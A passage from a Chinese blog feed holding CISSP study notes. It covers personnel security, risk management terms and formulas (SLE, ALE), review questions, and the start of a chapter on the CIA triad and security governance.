工作职责是要求员工在常规的基础上执行的特定工作任务。根据他们的职责，员工需要访问各种不同的对象、资源和服务。在安全的网络上，用户必须被授予访问与其工作任务有关元素的权限。为了保持最大的安全性，应该按照最小特权原则分配访问权限。最小特权原则规定：在安全环境中，应该授予用户完成工作任务或工作职责所必需的最小访问权限。这条原则的实际应用要求对所有资源和功能进行低级别的粒度访问控制。</li><li><strong>岗位轮换</strong> 岗位轮换是一种简单的方法，组织通过让员工在不同的工作岗位间轮换职位来提高整体安全性。岗位轮换有两个作用。首先，它提供了一种知识冗余类型。当许多员工中的每一位都有能力胜任所要求的若干工作岗位时，如果因为疾病或其他事件导致一位或多位员工在较长的时间内无法工作，那么组织遭受严重停工或生产效率降低的可能性就较小。</li></ul><h4 id="2-1-1-筛选候选人"><a href="#2-1-1-筛选候选人" class="headerlink" title="2.1.1 筛选候选人"></a>2.1.1 筛选候选人</h4><p>　　对于职位的安全性来说，背景调查和安全检查是证明候选人能够胜任工作、具备工作资格和值得信赖的必要因素。</p><h4 id="2-1-2-雇佣协议和策略"><a href="#2-1-2-雇佣协议和策略" class="headerlink" title="2.1.2 雇佣协议和策略"></a>2.1.2 雇佣协议和策略</h4><p>　　雇佣新员工时，应该签署雇佣协议。协议文档概略说明了组织的规则和限制、安全策略、可接受的使用和行为准则、详细的工作描述、破坏活动及其后果、要求员工胜任工作所需的时间。其中，很多条目都是独立的文挡。<br>　　保密协议(NonDisclosure Agreement，NDA)用来保护组织的机密信息不会被以前的员工泄漏。</p><h4 id="2-1-3-解雇员工的流程"><a href="#2-1-3-解雇员工的流程" class="headerlink" title="2.1.3 解雇员工的流程"></a>2.1.3 解雇员工的流程</h4><p>　　离职面谈的主要目的是： 根据前雇员签署的雇佣协议、保密协议和其他安全相关文档来审查责任和约束条件。<br>以下列出了应该尽快处理的其他事直：</p><ul><li>确认员工己归还放在交通工具或家中的组织配发的装置或供应品。</li><li>删除或禁用员工的网络用户账号。</li><li>通知人力资源部门支付最后的薪水，把未使用的休假换成工资，终止所有的福利待遇。</li><li>安排安全部门的人员陪同被解雇的员工在工作场所收拾他们的个人物品。</li><li>通知所有安全人员以及监控出入口的其他人员，确保被解雇的员工只能在安全人员护送下再次进入工作场所。</li></ul><h4 id="2-1-4-供应商、顾问和承包商控制"><a href="#2-1-4-供应商、顾问和承包商控制" class="headerlink" title="2.1.4 供应商、顾问和承包商控制"></a>2.1.4 供应商、顾问和承包商控制</h4><p>服务级别协议(Service-Level Agreement，SLA)中处理的常见问题：</p><ul><li>系统运行时间(作为总体运行时间的百分比)</li><li>最长连续停机时间( 以秒或分钟等计算)</li><li>最大负载</li><li>平均负载</li><li>诊断任务</li><li>故障转移时间(如果冗余处于适当位置)</li></ul><h4 id="2-1-5-合规性"><a href="#2-1-5-合规性" class="headerlink" title="2.1.5 合规性"></a>2.1.5 合规性</h4><p>　　合规是符合或遵守规则、策略、法规、标准或要求的行为。</p><h4 id="2-1-6-隐私"><a href="#2-1-6-隐私" class="headerlink" title="2.1.6 隐私"></a>2.1.6 隐私</h4><ul><li>主动防止对个人可确认的信息(也就是与某人或某个组织直接联系的数据点)的未授权访问。</li><li>防止对被视为个人的或秘密的信息进行未授权的访问。</li><li>防止未被同意或知晓的观察、监控或检查行为。</li></ul><h3 id="2-2-安全治理"><a href="#2-2-安全治理" class="headerlink" title="2.2 安全治理"></a>2.2 安全治理</h3><p>　　安全治理是与支持、定义和指导组织安全工作相关的实践集合。</p><h3 id="2-3-理解和应用风险管理概念"><a href="#2-3-理解和应用风险管理概念" class="headerlink" title="2.3 理解和应用风险管理概念"></a>2.3 理解和应用风险管理概念</h3><p>　　风险管理的主要目的是要将风险降低到一个可以接受的级别。达到风险管理主要目标的过程被称为风险分析。<br>风险分析包括：</p><ul><li>分析环境中的风险</li><li>评估每种风险发生的可能性和造成的损失</li><li>评估各种风险对策的成本以及生成安全措施的成本/效益报告并呈交给上级管理者</li></ul><h4 id="2-3-1-风险术语"><a href="#2-3-1-风险术语" class="headerlink" title="2.3.1 风险术语"></a>2.3.1 风险术语</h4><ul><li><strong>资产</strong> 资产是指环境中应该加以保护的任何事物，是用于商业过程和任务中的任何东西。</li><li><strong>资产估值</strong> 资产估值指的是根据实际的成本和非货币性支出为资产分配的货币价值。</li><li><strong>威胁</strong> 任何可能发生的、为组织或某种特定资产带来所不希望的或不想要结果的事情都被称为威胁。</li><li><strong>脆弱性</strong> 资产中的弱点或防护措施/对策的缺乏被称为脆弱性。</li><li><strong>暴露</strong> 暴露是指由于威胁而容易造成资产损失，脆弱性会被或将被威胁主体或威胁事件加以利用的可能性是存在的。</li><li><strong>风险</strong> 风险是某种威胁利用脆弱性并导致资产损害的可能性，是对可能性、概率或偶然性的评估。</li><li><strong>防护措施</strong> 防护措施或对策是指能消除脆弱性或对付一种或多种特定威胁的任何方法。</li><li><strong>攻击</strong> 攻击指的是威胁主体对脆弱性的利用。</li><li><strong>破坏</strong> 破坏是指发生安全机制被威胁主体绕过或阻挠的事情。<img src="/notes/cissp学习笔记（2）——人员安全和风险管理概念/风险的元素.png" title="[风险的元素]"></li></ul><h4 id="2-3-2-识别威胁和脆弱性"><a href="#2-3-2-识别威胁和脆弱性" class="headerlink" title="2.3.2 识别威胁和脆弱性"></a>2.3.2 识别威胁和脆弱性</h4><p>　　威胁可能来自任何地方。<br>编制威胁列表时，需要考虑以下各项：</p><ul><li>病毒</li><li>级联错误(一系列逐步上升的错误)和相关性错误(由于依赖的事件或事物不存在而引起)</li><li>己授权用户的犯罪行为</li><li>运动现象(振动、炸裂声等)</li><li>有企图的攻击</li><li>重组</li><li>己授权的用户疾病或传染病</li><li>黑客</li><li>不满的员工</li><li>用户错误</li><li>自然灾害(地震、水灾、火灾、火山爆发、咫风、龙卷风、海啸等)</li><li>物理损坏(碎裂、抛射、线缆被切断等)</li><li>数据、资源或服务的误用</li><li>对数据分类或安全策略的改变或危害</li><li>政府、党派或军队的入侵或限制</li><li>处理错误、缓冲区溢出</li><li>滥用个人特权</li><li>温度失控</li><li>能量异常( 静电噪音、EM 脉冲、无线电频率、电源损耗、电涌等)</li><li>数据丢失</li><li>信息战争</li><li>破产或改变/中断业务活动</li><li>编码/编程错误</li><li>入侵(物理的或逻辑的)</li><li>环境因素(存在天然气、液体、生物等)</li><li>设备故障</li><li>物理盗窃</li><li>社会工程学</li></ul><h4 id="2-3-3-风险评估-分析"><a href="#2-3-3-风险评估-分析" class="headerlink" title="2.3.3 风险评估/分析"></a>2.3.3 风险评估/分析</h4><p>　　目前有两种风险评估方法： 定量的风险分析和定性的风险分析。定量的风险分析把真实的货币价值分配给损失的资<br>产。定性的风险分析把主观的和无形的价值分配给损失的资产。</p><ol><li>定量的风险分析</li><li>定性的风险分析</li></ol><h4 id="2-3-4-风险分配-接受"><a href="#2-3-4-风险分配-接受" class="headerlink" title="2.3.4 风险分配/接受"></a>2.3.4 风险分配/接受</h4><p>风险分析的结果包括：</p><ul><li>所有资产的完整且详细的评估。</li><li>所有威肋和风险、发生概率以及一旦发生的损失范围的详细列表。</li><li>针对特定威胁的并且标识出有效性与ALE的防护措施和对策列表。</li><li>每种防护措施的成本/效益分析。</li></ul><h4 id="2-3-5-对策的选择和评估"><a href="#2-3-5-对策的选择和评估" class="headerlink" title="2.3.5 对策的选择和评估"></a>2.3.5 对策的选择和评估</h4><p>　　对策和防护措施需要根据业务任务的上下文进行评估。</p><h4 id="2-3-6-实施"><a href="#2-3-6-实施" class="headerlink" title="2.3.6 实施"></a>2.3.6 实施</h4><p>　　安全控制、对策和防护措施可以通过行政管理性、逻辑/技术性或物理性控制来实现。</p><h4 id="2-3-7-控制的类型"><a href="#2-3-7-控制的类型" class="headerlink" title="2.3.7 控制的类型"></a>2.3.7 控制的类型</h4><ul><li>1.威慑</li><li>2.预防</li><li>3.检测</li><li>4.补偿</li><li>5.纠正</li><li>6.恢复</li><li>7.指令</li></ul><h4 id="2-3-8-监控和测量"><a href="#2-3-8-监控和测量" class="headerlink" title="2.3.8 监控和测量"></a>2.3.8 监控和测量</h4><h4 id="2-3-9-资产评估"><a href="#2-3-9-资产评估" class="headerlink" title="2.3.9 资产评估"></a>2.3.9 资产评估</h4><p>对有形资产和无形资产的估值：</p><ul><li>购置成本</li><li>开发成本</li><li>经营或管理成本</li><li>维护或保养成本</li><li>获得资产的成本</li><li>保护或维持资产的成本</li><li>所有者和用户的价值</li><li>竞争者的价值</li><li>知识产权或资产的价值</li><li>市场评估(可维持的价格)</li><li>产品换代成本</li><li>生产率提升或下降</li><li>资产存在和损失的运营成本</li><li>资产损失责任</li><li>用处</li></ul><h4 id="2-3-10-持续改进"><a href="#2-3-10-持续改进" class="headerlink" title="2.3.10 持续改进"></a>2.3.10 持续改进</h4><p>　　安全性总是在不断变化。因此，随着时间的推移，任何己经实现的安全解决方案都需要更新和更改。如果不是由选定的对策提供连续的完善路径，那么应该将其替换为可以为安全性提供灵活改进的对策。</p><h4 id="2-3-11-风险框架"><a href="#2-3-11-风险框架" class="headerlink" title="2.3.11 风险框架"></a>2.3.11 风险框架</h4><p>风险管理系统有以下特点：</p><ul><li>通过实施强劲且持续不断的监管过程促进实时风险管理概念和不间断的信息系统授权概念的提升。</li><li>鼓励通过自动化操作，向高层领导者提供必要的信息以帮助他们在组织信息系统方面做出基于风险且划算的决定，以支持他们的核心任务和商业功能。</li><li>将信息安全与公司系统结构以及系统开发生命周期相结合。</li><li>强调选择、实施、评估、安全控制的监管以及信息系统的授权。</li><li>通过风险管理(功能)将信息系统层面的风险管理过程与组织层面的风险管理过程相联系。</li></ul><p>为部署在组织信息系统中井使用这些系统的安全控制建立责任和问责一体化制度。风险管理系统的步骤包括：</p><ul><li>分类</li><li>选择</li><li>实施</li><li>评估</li><li>授权</li><li>监控</li></ul><img src="/notes/cissp学习笔记（2）——人员安全和风险管理概念/风险管理框架的6个步骤.png" title="[风险管理框架的6个步骤]"><h3 id="2-4-建立和管理信息安全教育、培训和意识"><a href="#2-4-建立和管理信息安全教育、培训和意识" class="headerlink" title="2.4 建立和管理信息安全教育、培训和意识"></a>2.4 建立和管理信息安全教育、培训和意识</h3><p>　　安全培训的先决条件是意识。培养安全意识的目标是要将安全放到首位并让用户认识到这一点。意识在整个组织机构之间建立了通用的安全理解基线或基础。</p><h3 id="2-5-管理安全功能"><a href="#2-5-管理安全功能" class="headerlink" title="2.5 管理安全功能"></a>2.5 管理安全功能</h3><ul><li>安全必须符合成本效益原则</li><li>安全必须可度量</li><li>安全机制本身和安全治理过程都会消耗资源</li><li>安全管理功能包括信息安全策略的开发和执行</li></ul><h3 id="2-6-考试要点"><a href="#2-6-考试要点" class="headerlink" title="2.6 考试要点"></a>2.6 考试要点</h3><ul><li><strong>知道隐私如何被放入IT 安全领域</strong> 知道隐私的多重含主U定义，为什么保护它是非常重要的，以及围绕隐私尤其是在工作环境中的隐私的各种问题。</li><li><strong>能够讨论安全的第三方治理</strong> 第三方治理的监督制度可以根据法律、法规、行业标准或许可要求进行强制执行。</li><li><strong>能够定义整体的风险管理</strong> 风险管理的过程如下： 识别可能造成数据损坏或泄漏的因素、根据数据的价值与对策的成本来评估这些因素，以及实现能够减轻或降低风险的有成本效益的解决方案。通过执行风险管理，就能够为降低整体风险奠定基础。</li><li><strong>理解风险分析及涉及的要素</strong> 执行风险分析能够为上层管理者提供详细、必要的依据，从而使其决定哪些风险应当被削弱、哪些风险应当被转移以及哪些风险应当被接受。为了全面评估风险和随后采取恰当的防范措施，就必须分析下列要素： 资产、资产估值、威胁、脆弱性、暴露、风险、己发生的风险、防护措施、对策、攻击和突破。</li><li><strong>知道如何评估威胁</strong> 威胁可能有很多来源，包括町、人和自然界。以团队的形式评估风险以便提供范围最广的视角。通过从各个角度全面地评估风险，就可以减少系统的脆弱性。</li><li><strong>理解定量的风险分析</strong> 定量的风险分析关注硬性指标和百分比。全部使用定量分析是不可能的，因为风险的某些方面是无形的。定量的风险分析过程涉及： 资产估值和威胁识别，接着确定威胁发生的潜在频率和损失，结果是防护措施的成本/效益分析。</li><li><strong>能够解释暴露因子(EF)的概念</strong> 暴露因子是定量风险分析的一个元素，表示组织的某种特定资产被己发生的风险损坏后造成损失的百分比。通过计算暴露因子，能够较好地实现风险管理策略。</li><li><strong>了解单一损失期望(SLE)井知道如何计算</strong> SLE是定量风险分析的一个元素，表示与针对特定资产的单个己发生风险相关联的成本。计算SLE时，可以使用公式： SLE=资产价值(AV) *暴露因子(EF)。</li><li><strong>理解年发生比率(ARO)</strong> ARO是定量风险分析的一个元素，指的是特定威胁或风险在一年内将会发生(也就是成为现实)的预计频率。理解ARO能够进一步计算风险和采取适当的防范措施。</li><li><strong>了解年度损失期望(ALE)井知道如何计算</strong> ALE是定量风险分析的一个元素，指的是针对某种特定的资产，所有己实施的威胁每年可能造成的损失成本。计算ALE 时可以使用公式： ALE=单一损失期望(SLE)*年发生比率(ARO)。</li><li><strong>了解评估防护措施的公式</strong> 除了确定防护措施每年的成本外，还必须计算实现措施后资产的ALE。为此，可以使用下面这个公式： 实现防护措施前的ALE- 实现防护措施后的ALE-每年的防护措施成本=公司防护措施的价值，即(ALEl - ALE2) - ACS。</li><li><strong>理解定性的风险分析</strong> 定性的风险分析更多是根据场景而不是根据计算。这种方式不是为可能发生的损失分配准确的货币价值，而是按程度将威胁分成等级，从而评估其风险、成本和影响。这些分析结果可以帮助那些负责制定风险管理策略的人。</li><li><strong>理解Delphi技术</strong> Delphi技术只是一个简单的匿名反馈和响应过程，这个过程被用于达成一致意见。达成的一致意见为责任方提供了正确评估风险和实施解决方案的机会。</li><li><strong>了解处理风险的选项</strong> 降低风险或风险缓解是防护措施和对策的实现。风险转让或转移风险是把风险带来的损失成本转移给另一个实体或组织。购买保险就是转让或转移风险的一种常见形式。接受风险是因为管理层对可能采用的防护措施进行了成本/效益分析上的评估，并且确定对策的戚本远远超过风险可能造成的损失的成本，还意味着管理层己经同意接受风险发生所造成的结果和损失。</li><li><strong>能够解释总风险、剩余风险和控制间隙</strong> 总风险指的是在没有实现防护措施的情况下，组织将要面对的风险数量。计算总风险的公式是： 威胁<em>脆弱性</em>资产价值=总风险。剩余风险是管理层选择接受而不是缓解的风险。总风险和剩余风险之间的差值被称为控制间隙，控制间隙是指通过实现防护措施被减少的风险数量。计算剩余风险的公式是： 总风险控制间隙=剩余风险。</li><li><strong>理解控制类型</strong> “访问控制”这一术语指的是一系列执行以下任务的控制=确保只有授权用户能够登录而未授权用户不能访问资源。控制类型包括预防、测探、校正、警报、恢复、指令和补偿控制。按执行方式控制可分为：行政管理性控制、逻辑性控制或物理性控制。</li><li><strong>理解雇佣新员工的安全含义</strong> 为了制定合适的安全计划，必须具有工作描述、工作分类、工作任务、工作职责、阻止共谋、候选人筛选、背景调查、安全许可、雇佣协议和竞业禁止协议的标准。通过部署这些机制，确保新雇佣的人员意识到要求的安全标准，从而保护组织的资产。</li><li><strong>能够解释职责分离</strong> 职责分离属于安全概念，指的是将关键的、重要的和敏感的工作任务分配给不同的人。通过分离责任这种方式，就可以确保任何人不可能危及系统安全。</li><li><strong>理解最小特权原则</strong> 最小特权原则表明，在安全环境中，用户应该被授予完成要求的工作任务或工作职责所必需的最少访问权限。通过限制用户只能访问完成工作任务所要求的那些资源，就能限制敏感信息的脆弱性。</li><li><strong>了解岗位轮换和强制性休假是必要的</strong> 岗位轮换有两个作用： 提供了一种知识元余类型： 人员流动可以减少伪造、数据更改、偷窃、阴谋破坏和信息滥用的风险。一到两个星期的强制性休假被用于审计和认证员工的工作任务和权限。这种做法往往比较容易发现滥用、欺诈或疏忽行为。</li><li><strong>理解供应商控制、顾问控制和承包商控制</strong> 利用供应商控制、顾问控制以及承包商控制来确定这个主要组织外部的不同实体、个人或机构的绩效水平、期望值高低、薪酬水平以及影响程度。通常情况下，服务水平协议(SLA) 的文件或政策中会对这些控制进行明确规定。</li><li><strong>能够解释适当的解雇策略</strong> 解雇策略定义了解雇员工的过程，应当包括： 始终有一位证人在场，禁止员工访问网络，进行离职面谈，护送员工离开办公室，交回安全标志和门卡，返还公司的财产。</li><li><strong>了解如何实现安全意识培训</strong> 在真正的培训开始之前，必须让用户树立主人翁的安全意识。一旦树立了安全意识，培训或教育员工执行工作任务和遵守安全策略就可以开始了。所有的新员工都需要进行培训。这样他们才能够遵守安全策略中规定的所有标准、指导方针和步骤。教育是一项更细致的工作，学生/用户需要学习比他们完成工作任务实际所需知识多得多的知识。教育往往与用户参加认证考试或寻求职务晋升相关联。</li><li><strong>理解如何管理安全功能</strong> 为了实现管理安全功能，组织必须采取恰当且充分的安全治理。执行风险评估以驱动安全政策的施行是最明显、最直接的安全功能管理例子。同时这也和预算、度量、资源以及信息安全策略以及评估安全系统的完整性及有效性息息相关。</li><li><strong>了解风险管理框架的6个步骤</strong> 风险管理框架的6 个步骤分别是： 分类、选择、实施、评估、授权和监控。</li></ul><h3 id="2-7-复习题"><a href="#2-7-复习题" class="headerlink" title="2.7 复习题"></a>2.7 复习题</h3><ol><li><p>以下哪一项是任何安全解决方案中最薄弱的元素?<br>A. 软件产品<br>B. 互联网连接<br>C. 安全策略<br>D. 人</p></li><li><p>当试图雇佣新员工时，首先要做什么?<br>A. 创建工作描述<br>B. 设置职位分类<br>C. 审查候选人<br>D. 要求简历</p></li><li><p>以下哪一项是离职面谈的主要目的?<br>A. 返还离职员工的个人物品。<br>B. 审查保密协议。<br>C. 评估离职员工的表现。<br>D. 取消离职员工的网络访问账户</p></li><li><p>当员工被解雇时，接下来应该做什么?<br>A. 在他们被正式解雇前几个小时通知员工。<br>B. 一旦他们被通知解雇，就禁用员工的网络访问权。<br>C. 发送一封广播的电子邮件通知大家，某个员工将被解雇。<br>D. 等到你和雇员是楼里唯一剩下的人时宣布解雇。</p></li><li><p>如果一个组织与外部实体签订合同，提供关键业务功能或服务，例如账户或技术支持。用于<br>确保这些实体能够提供充分的安全性的流程被称为什么?<br>A. 资产识别<br>B. 第三方管理<br>C. 离职审查<br>D. 定性分析</p></li><li><p>___的一部分是业务流程和组织策略的逻辑和实际调查。这个过lV策略审查确保定期的和执行的业务任务、系统和方法是可行、有效的，并且具有成本效益，但最重要的是(至少相对于安全治理)，他们通过减少脆弱性和避免、减少或缓解风险来支持安全性。<br>A. 混合评估<br>B. 风险规避过程<br>C. 对策选择<br>D. 文档审查</p></li><li><p>以下哪一项不是正确的?<br>A. IT安全只能针对逻辑性或技术性的攻击提供保护。<br>B. 实现风险管理目标的过程被称为风险分析。<br>C. 对于IT基础设施的风险是以所有计算机为基础的。<br>D. 资产是在业务流程或任务中使用的任何东西。</p></li><li><p>下列哪一项不是风险分析过程中的元素?<br>A. 为风险分析环境。<br>B. 为防护措施创建成本/收益报告并提交给上层管理者。<br>C. 选择适当的防护措施并实施它们。<br>D. 评估每个威胁事件，及其发生和造成损害的成本和可能性。</p></li><li><p>在风险分析中，下列哪一项一般不会被认为是资产?<br>A. 开发过程<br>B. IT基础设施<br>C. 专有的系统资源<br>D. 用户的个人文件</p></li><li><p>以下哪一项表示偶然的或有意的漏洞利用?<br>A. 威胁事件<br>B. 风险<br>C. 威胁代理<br>D. 破坏</p></li><li><p>当没有或缺乏防护措施和对策时，会存在什么?<br>A. 脆弱性<br>B. 暴露<br>C. 风险<br>D. 渗透</p></li><li><p>下列哪一项不是有效的风险定义?<br>A. 几率、可能性或机会的评估<br>B. 移除脆弱性或防止一个(或多个)特定攻击发生的任何事情<br>C. 风险=威胁*脆弱性<br>D. 每个暴露实例</p></li><li><p>当评估防护措施时，在大多数情况下应遵循什么规则?<br>A. 资产年度损失期望成本不应该超过年度的保护成本。<br>B. 防护措施的年度成本应该等于资产价值。<br>C. 防护措施的年度成本不应该超过资产的年度损失期望。<br>D. 防护措施的年度成本不应该超过安全预算的10%。</p></li><li><p>单一损失期望是怎样计算的?<br>A. 威胁+脆弱性<br>B. 资产价值<em>暴露因子<br>C. 年发生比率</em>脆弱性<br>D. 年发生比率<em>资产价值</em>暴露因子</p></li><li><p>一家公司的防护措施的价值怎样计算?<br>A. 使用防护措施前的ALE-使用防护措施后的ALE 防护措施的年度成本<br>B. 防护前ALE*防护措施的ARO<br>C. 执行防护后ALE+年度防护价值-控制间隙<br>D. 总风险一控制间隙</p></li><li><p>什么安全控制直接关注于防止共谋?<br>A. 最小特权原则<br>B. 工作描述<br>C. 职责分离<br>D. 定量的风险分析</p></li><li><p>什么样的流程或事件通常是由组织主持，针对具有相似工作职能的员工群体?<br>A. 教育<br>B. 意识<br>C. 培训<br>D. 解雇</p></li><li><p>以下哪一项没有具体或直接关系到组织的安全功能管理?<br>A. 员工工作满意度<br>B. 度量<br>C. 信息安全策略<br>D. 预算</p></li><li><p>由于缺少灭火器，你意识到一场火灾的威胁和脆弱性，然后开始执行风险分析。基于这些<br>信息，下列哪些是可能的风险?<br>A. 病毒感染<br>B. 设备损坏<br>C. 系统故障<br>D. 未授权地访问机密信息</p></li></ol><p>20 通过特定的威胁/脆弱性/风险关系，己经执行了基本的定量风险分析。选择一个可能的对策。当再次计算时，下列哪个因素会变化?<br>A. 暴露因子<br>B. 单一损失期望<br>C. 资产价值<br>D. 年发生比率</p>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（1）——通过原则和策略的安全治理</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5%E7%9A%84%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5%E7%9A%84%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>A. 理解和应用机密性、完整性和可用性的概念</li><li>B. 应用安全治理原则，通过：<ul><li>B.1 安全功能与战略、目标、使命和愿景的一致(例如商业案例、预算和资源)</li><li>B.2 组织的流程(例如并购、剥离和治理委员会)</li><li>B.3 安全角色和职责</li><li>B.4 控制架构</li><li>B.5 应尽关注</li><li>B.6 应尽职责</li></ul></li><li>F. 开发和实现文档化的安全策略、标准、程序和指南</li><li>J. 理解和应用威胁建模<ul><li>J.1 识别威胁(例如竞争对手、供应商、雇员和值得信赖的伙伴)</li><li>J.2 确定和用图表示潜在攻击(例如社会工程学、欺骗)</li><li>J.3 执行降低分析</li><li>J.4 修复威胁的技术和流程(例如软件架构和操作)</li></ul></li><li>K. 把安全风险考虑到收购策略和实践中<ul><li>K.l 硬件、软件和服务</li><li>K.2 第三方评估和监控(例如现场评估、文件传递和审查、流程/策略审查)</li><li>K.3 最小化安全需求</li><li>K.4 服务级别需求</li></ul></li></ul><h3 id="1-1-理解和应用机密性、完整性和可用性的概念"><a href="#1-1-理解和应用机密性、完整性和可用性的概念" class="headerlink" title="1.1 理解和应用机密性、完整性和可用性的概念"></a>1.1 理解和应用机密性、完整性和可用性的概念</h3><p>　　安全的三要素：C(机密性-Confidentiality)I(完整性-Integrity)A(可用性-Availability)</p><h4 id="1-1-1-机密性"><a href="#1-1-1-机密性" class="headerlink" title="1.1.1 机密性"></a>1.1.1 机密性</h4><p>　　如果安全机制提供机密性，那么它就为限制未授权主体不能访问数据、客体或资源提供了高级别保证。如果存在对机密性的威胁，那么就有可能发生未授权的泄漏。<br>机密性的其他概念、条件和特征包括：</p><ul><li><strong>敏感性</strong> 敏感性是指信息的品质，如果这种信息被披露，就可能会造成伤害或损坏。维护敏感信息的机密性有助于预防伤害或损坏。</li><li><strong>自主性</strong> 自主性是一种决策行为，操作员可以凭这种权利影响或控制信息的披露，以便将伤害或损坏降到最低。</li><li><strong>关键性</strong> 信息的关键级别是对其关键性的评测。关键级别越高，越需要保持信息的机密性。高级别的关键性对一个组织的运营和功能是必不可少的。</li><li><strong>隐蔽性</strong> 隐蔽是一种隐蔽或防止披露的行为。隐蔽通常被视为覆盖、混淆或干扰的一种手段。</li><li><strong>保密性</strong> 保密是一种保守秘密或防止信息泄露的行为。</li><li><strong>隐私性</strong> 隐私是指要保持信息处于机密状态，这些可能是个人识别信息，或是如果泄露就可能对某人造成伤害、尴尬或丢人的信息。</li><li><strong>隐藏性</strong> 隐藏就是把信息存储到一个偏僻的位置。这个位置还可以附加严格的访问控制。隐藏有助于实施机密性保护。</li><li><strong>隔离性</strong> 隔离是指把特定信息与其他信息分隔开来的行为。隔离可以用来防止信息混杂或信息泄露。</li></ul><h4 id="1-1-2-完整性"><a href="#1-1-2-完整性" class="headerlink" title="1.1.2 完整性"></a>1.1.2 完整性</h4><p>　　为了维护完整性，客体必须保持自身的正确性，并且只能由被授权的主体进行有意修改。<br>我们可以从下列三个方面查看完整性：</p><ul><li>应该禁止未授权的主体执行修改操作。</li><li>应该禁止经过授权的主体执行未授权的修改操作，例如失误。</li><li>客体应当内外保持一致，这样它们的数据才能正确井真实地反映现实情况，并且与任何子客体、同等客体或父客体的关系都是有效的、一致的和可检验的。</li></ul><h4 id="1-1-3-可用性"><a href="#1-1-3-可用性" class="headerlink" title="1.1.3 可用性"></a>1.1.3 可用性</h4><p>　　可用性指的是经过授权的主体被及时准许和不间断地访问客体。</p><h4 id="1-1-4-其他安全概念"><a href="#1-1-4-其他安全概念" class="headerlink" title="1.1.4 其他安全概念"></a>1.1.4 其他安全概念</h4><ol><li><p>身份标识<br>身份标识是一个过程，在这个过程中，主体会表明身份，并且开启可问责性。主体必须向系统提供身份，从而启动身份认证、授权和可问责性的过程。</p></li><li><p>身份认证<br>身伤1证要求来自主体的附加信息必须完全对应于被表明的身份。</p></li><li><p>授权<br>授权的过程确保被请求的活动或客体访问，可以获得通过身份认证和指派的权利和特权。</p></li><li><p>审计<br>审计或监控是程序化方式，通过这种方式，主体在系统中经过身份认证的行为是可问责的。</p></li><li><p>可问责性<br>通过审计、授权、身份认证与身份标识这些安全服务和机制，将联机身份的活动与某个人联系在一起，就可以建立可问责性。</p></li><li><p>不可否认性<br>不可否认性确保活动或事件的主体无法否认所发生的事件。不可否认性能够防止主体宣称自己没有发送消息、没有执行过某项活动或者不是某个事件的起因。</p></li></ol><h4 id="1-1-5-保护机制"><a href="#1-1-5-保护机制" class="headerlink" title="1.1.5 保护机制"></a>1.1.5 保护机制</h4><ol><li><p>分层<br>分层只是简单地使用连续的多重控制，也被称为深层防御。使用连续分层法而不是并行分层法，这一概念非常重要。通过连续方式执行安全限制意味着使用线性的方式依次执行。只有通过一系列配置，才能由每个安全控制对攻击进行扫描、评估或缓解。单个安全控制方法的失败不会使整个解决方案失效。如果安全控制是以并行方式执行的，某个威胁就可能穿过单个检查点，从而无法消除该威胁特殊的恶意活动。</p></li><li><p>抽象<br>抽象是为提高效率而使用的。相似的元素被放入组、类别或角色(被整体性授予安全控制、限制或权限)中。因此，当为客体分类或为主体分配角色时，就需要使用抽象的概念。</p></li><li><p>数据隐藏<br>数据隐藏通过将数据置于主体不可访问或无法看到的存储空间，从而防止主体发现或访问数据。</p></li><li><p>加密<br>加密可以具有很多形式，并且能够被应用于所有的电子通信类型，包括文本、音频和视频文件以及应用程序本身。</p></li></ol><h3 id="1-2-应用安全治理原则"><a href="#1-2-应用安全治理原则" class="headerlink" title="1.2 应用安全治理原则"></a>1.2 应用安全治理原则</h3><p>　　安全治理是实践行为的集合，这些实践都与支持、定义和指导组织的安全工作相关。安全治理与组织和IT治理密切相关，而且经常交织在一起。这三种治理的目标一般是相同或相关的。</p><h4 id="1-2-1-安全功能战略、目标、任务和愿景的一致"><a href="#1-2-1-安全功能战略、目标、任务和愿景的一致" class="headerlink" title="1.2.1 安全功能战略、目标、任务和愿景的一致"></a>1.2.1 安全功能战略、目标、任务和愿景的一致</h4><p>　　解决安全管理计划编制的最有效方法是采用自上而下的方式。上层、高层或管理部门负责启动和定义组织的安全策略。安全策略为组织中较低级别的人员指出了方向。中层管理部门的职责是在安全策略的指导下制定标准、基准、指导方针和程序。接着，操作管理者或安全专家负责实现在安全管理文档中规定的配置要求。最后，最终用户必须遵守组织制定的所有安全策略。<br>安全管理计划编制的元素包括：</p><ul><li>定义安全角色</li><li>规定如何管理安全性、谁负责安全性以及如何测试安全性的效力</li><li>开发安全策略</li><li>执行风险分析</li><li>以及要求对员工进行安全教育</li></ul><h4 id="1-2-2-组织流程"><a href="#1-2-2-组织流程" class="headerlink" title="1.2.2 组织流程"></a>1.2.2 组织流程</h4><p>1 . 变更控制/变更管理<br>　　变更管理应该用于监督系统每个方面发生的变更，包括硬件配置、操作系统和应用软件的变更。变更管理应该被包含在设计、开发、测试、评估、实现、分发、演变、发展、持续操作以及修改中。变更管理不仅需要每个组件和配置的详细目录，而且还需要为每个系统组件(从硬件到软件，以及从配置设置到安全特性)收集和维护完整的文档。<br>配置或变更管理的变更控制过程具有以下几个目标或要求：</p><ul><li>以受监控的和有序的方式实现变更。变更总是处在控制之下。</li><li>包含正式的测试过程，这种过程用于确认变更产生的预期结果。</li><li>所有的变更都可以撤消(也被称为回退或回滚计划/流程)。在变更发生前向用户发出通知，避免降低生产率。</li><li>对变更的影响应进行系统分析。</li><li>变更对能力、功能和性能产生的负面效应最小化。</li><li>变更由变更审批委员会(Change Approval Board 